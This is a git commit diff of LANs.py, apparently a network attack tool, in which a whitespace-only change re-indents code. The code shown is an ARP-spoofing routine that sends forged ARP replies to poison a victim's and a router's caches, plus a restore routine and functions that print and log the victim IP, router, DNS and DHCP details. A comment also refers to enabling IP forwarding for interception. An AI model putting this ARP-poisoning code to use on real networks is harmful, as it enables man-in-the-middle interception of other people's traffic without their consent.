0a525d38eaedf7ee04ed9a21a6b057fef05e125a
Robert Summer Jr <rsumner868@icloud.com>
2018-04-29 09:19:08 -0500

    latest update
    Conflicts:
    	LANs.py

--- LANs.py
+++ LANs.py
@@ -81,17 +81,17 @@ logger = open('LANspy.log.txt', 'w+')
 DN = open(devnull, 'w')
 
 class Spoof():
-	def originalMAC(self, ip):
-		# srp is for layer 2 packets with Ether layer, sr is for layer 3 packets like ARP and IP
-		ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3)
-		for s,r in ans:
-			return r.sprintf("%Ether.src%")
-	def poison(self, routerIP, victimIP, routerMAC, victimMAC):
-		send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
-		send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
-	def restore(self, routerIP, victimIP, routerMAC, victimMAC):
-		send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
-		send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)
+   def originalMAC(self, ip):
+      # srp is for layer 2 packets with Ether layer, sr is for layer 3 packets like ARP and IP
+      ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3)
+      for s,r in ans:
+         return r.sprintf("%Ether.src%")
+   def poison(self, routerIP, victimIP, routerMAC, victimMAC):
+      send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
+      send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
+   def restore(self, routerIP, victimIP, routerMAC, victimMAC):
+      send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
+      send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)
 
 class Parser():
 
@@ -816,14 +816,14 @@ class active_users():
 
 #Print all the variables
 def print_vars(DHCPsrvr, dnsIP, local_domain, routerIP, victimIP):
-	print "[*] Active interface: " + interface
-	print "[*] DHCP server: " + DHCPsrvr
-	print "[*] DNS server: " + dnsIP
-	print "[*] Local domain: " + local_domain
-	print "[*] Router IP: " + routerIP
-	print "[*] Victim IP: " + victimIP
-	logger.write("[*] Router IP: " + routerIP+'\n')
-	logger.write("[*] victim IP: " + victimIP+'\n')
+   print "[*] Active interface: " + interface
+   print "[*] DHCP server: " + DHCPsrvr
+   print "[*] DNS server: " + dnsIP
+   print "[*] Local domain: " + local_domain
+   print "[*] Router IP: " + routerIP
+   print "[*] Victim IP: " + victimIP
+   logger.write("[*] Router IP: " + routerIP+'\n')
+   logger.write("[*] victim IP: " + victimIP+'\n')
 
 #Enable IP forwarding and flush possibly conflicting iptables rules
 def setup(victimMAC):
